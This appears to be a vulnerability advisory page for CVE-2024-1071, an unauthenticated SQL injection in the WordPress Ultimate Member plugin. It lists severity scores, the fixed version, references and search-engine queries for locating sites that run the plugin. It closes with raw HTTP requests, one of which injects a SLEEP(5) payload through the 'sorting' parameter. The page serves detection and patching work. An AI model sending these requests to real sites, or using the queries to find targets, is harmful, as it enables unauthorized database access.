---
layout: post
cve_id: CVE-2024-1071
title: WordPress Ultimate Member 2.1.3 - 2.8.2 ‚Äì SQL Injection
pcap: true
pcap_path: /pcaps/2024/CVE-2024-1071.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-1071.yaml
snort2_rule: N/A
snort3_rule: N/A
author: DhiyaneshDK,iamnooob
severity: critical
impact: 'Unauthenticated attackers can execute time-based SQL injection through the
  sorting parameter in the member directory to extract the complete WordPress database
  including user credentials, member profiles, and sensitive site data.

  '
remediation: Fixed in 2.8.3
reference:
- https://www.wordfence.com/blog/2024/02/2063-bounty-awarded-for-unauthenticated-sql-injection-vulnerability-patched-in-ultimate-member-wordpress-plugin/
- https://securityonline.info/cve-2024-1071-wordpress-ultimate-member-plugin-under-active-attack/
- https://plugins.trac.wordpress.org/browser/ultimate-member/tags/2.8.2/includes/core/class-member-directory-meta.php?rev=3022076
- https://plugins.trac.wordpress.org/browser/ultimate-member/tags/2.8.2/includes/core/class-member-directory-meta.php?rev=3022076#L666
- https://plugins.trac.wordpress.org/browser/ultimate-member/tags/2.8.2/includes/core/class-member-directory-meta.php?rev=3022076#L858
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2024-1071
  cwe-id: CWE-89
  epss-score: 0.92912
  epss-percentile: 0.9976
  cpe: cpe:2.3:a:ultimatemember:ultimate_member:*:*:*:*:wordpress:*:*:*
metadata:
  verified: true
  max-request: 2
  framework: wordpress
  fofa-query: body="/wp-content/plugins/ultimate-member"
  publicwww-query: /wp-content/plugins/ultimate-member/
  zoomeye-query: app="WordPress Ultimate Member Plugin"
  product: ultimate_member
  vendor: ultimatemember
tags:
- time-based-sqli
- cve
- cve2024
- ultimate-member
- wpscan
- wordpress
- wp-plugin
- sqli
- vkev
- vuln
---

## üîç Vulnerability Description
The Ultimate Member - User Profile, Registration, Login, Member Directory, Content Restriction & Membership Plugin plugin for WordPress is vulnerable to SQL Injection via the ‚Äòsorting‚Äô parameter in versions 2.1.3 to 2.8.2 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query. This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.


## üåê HTTP Request
```nohighlight
GET /?p=1 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /wp-admin/admin-ajax.php?action=um_get_members HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.5.20) Gecko/ Firefox/3.6.17
Connection: close
Content-Length: 59
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

directory_id=b9238&sorting=user_login,SLEEP(5)&nonce=IwIn5L
```

